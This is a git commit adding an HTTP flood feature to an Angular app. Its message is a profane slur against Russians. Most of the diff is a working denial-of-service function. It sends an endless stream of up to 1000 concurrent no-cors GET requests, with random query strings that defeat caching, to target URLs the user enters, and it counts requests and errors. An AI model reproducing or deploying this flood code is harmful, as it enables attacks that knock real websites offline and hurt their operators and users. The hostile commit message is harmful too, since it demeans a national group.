dc8fdf7b655c64bcc063e0f69ac41b63c3d512a1
Artur Kulchytskyi <artur.kulchytskyi@netdocuments.com>
2022-02-28 12:19:30 +0200

    fuck russions

--- src/app/app.component.ts
+++ src/app/app.component.ts
@@ -1,10 +1,104 @@
 import { Component } from '@angular/core';
-
 @Component({
   selector: 'app-root',
   templateUrl: './app.component.html',
-  styleUrls: ['./app.component.css']
+  styleUrls: ['./app.component.css'],
 })
 export class AppComponent {
-  title = 'ghost';
+  targets: string[] = [];
+  queue: any[] = [];
+  targetStats: any;
+  url: string = '';
+
+  private readonly CONCURRENCY_LIMIT = 1000;
+
+  fetchWithTimeout(resource: any, options: any) {
+    const controller = new AbortController();
+    const id = setTimeout(() => controller.abort(), options.timeout);
+    return fetch(resource, {
+      method: 'GET',
+      mode: 'no-cors',
+      signal: controller.signal,
+    })
+      .then((response) => {
+        clearTimeout(id);
+        return response;
+      })
+      .catch((error) => {
+        clearTimeout(id);
+        throw error;
+      });
+  }
+
+  flood = async (target: any) => {
+    for (var i = 0; ; ++i) {
+      if (this.queue.length > this.CONCURRENCY_LIMIT) {
+        await this.queue.shift();
+      }
+      const rand = i % 3 === 0 ? '' : '?' + Math.random() * 1000;
+      this.queue.push(
+        this.fetchWithTimeout(target + rand, { timeout: 1000 })
+          .catch((error) => {
+            if (error.code === 20 /* ABORT */) {
+              return;
+            }
+            this.targetStats = this.targetStats.map((targetObj: any) => {
+              return {
+                ...targetObj,
+                requests:
+                  target === targetObj.target
+                    ? targetObj.requests + 1
+                    : targetObj.requests,
+              };
+            });
+          })
+          .then((response) => {
+            if (response && !response.ok) {
+              this.targetStats = this.targetStats.map((targetObj: any) => {
+                return {
+                  ...targetObj,
+                  errors:
+                    target === targetObj.target
+                      ? targetObj.errors + 1
+                      : targetObj.errors,
+                };
+              });
+            }
+            this.targetStats = this.targetStats.map((targetObj: any) => {
+              return {
+                ...targetObj,
+                requests:
+                  target === targetObj.target
+                    ? targetObj.requests + 1
+                    : targetObj.requests,
+              };
+            });
+          })
+      );
+    }
+  };
+
+  add(): void {
+    if (!this.url) {
+      return;
+    }
+    this.targets.push(this.url);
+    this.url = '';
+  }
+
+  start(): void {
+    this.targetStats = this.targets.map((target: string) => {
+      return {
+        target,
+        requests: 0,
+        errors: 0,
+      };
+    });
+
+    this.targets.map(this.flood);
+  }
+
+  delete(target: string): void {
+    this.targets = this.targets.filter((tar) => tar !== target);
+  }
 }
--- src/app/app.module.ts
+++ src/app/app.module.ts
@@ -2,15 +2,13 @@ import { NgModule } from '@angular/core';
 import { BrowserModule } from '@angular/platform-browser';
 
 import { AppComponent } from './app.component';
+import { HttpClientModule } from '@angular/common/http';
+import { CommonModule } from '@angular/common';
+import { FormsModule } from '@angular/forms';
 
 @NgModule({
-  declarations: [
-    AppComponent
-  ],
-  imports: [
-    BrowserModule
-  ],
-  providers: [],
-  bootstrap: [AppComponent]
+  declarations: [AppComponent],
+  imports: [BrowserModule, HttpClientModule, CommonModule, FormsModule],
+  bootstrap: [AppComponent],
 })
-export class AppModule { }
+export class AppModule {}
